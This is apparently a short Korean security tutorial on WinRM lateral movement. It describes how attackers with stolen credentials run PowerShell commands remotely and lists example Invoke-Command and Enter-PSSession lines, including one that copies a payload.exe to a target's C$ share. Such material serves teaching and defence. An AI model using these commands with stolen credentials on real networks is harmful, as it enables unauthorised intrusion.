WinRM

Windows Remote Management를 이용한 원격 명령 실행

#1. WinRM 횡적 이동이란?

🪟 ➜ ⚡ ➜ 💻 ➜ 🎯

"PowerShell Remoting으로 원격 명령 실행"

WinRM(Windows Remote Management)은 PowerShell Remoting의 기반 프로토콜입니다. 공격자는 탈취한 자격 증명으로 원격 시스템에서 PowerShell 명령을 실행하거나 대화형 세션을 열 수 있습니다.

WinRM 명령어

# 원격 명령 실행
Invoke-Command -ComputerName target -ScriptBlock { whoami }

# 대화형 세션
Enter-PSSession -ComputerName target

# WinRM 포트: 5985(HTTP), 5986(HTTPS)

#2. 공격 기법 분석

WinRM 원격 실행

# 여러 서버에 동시 명령 실행
Invoke-Command -ComputerName srv1,srv2,srv3 -ScriptBlock { Get-Process } -Credential $cred

# 파일 복사 및 실행
Copy-Item -Path payload.exe -Destination \\target\C$\Temp\ -ToSession $session
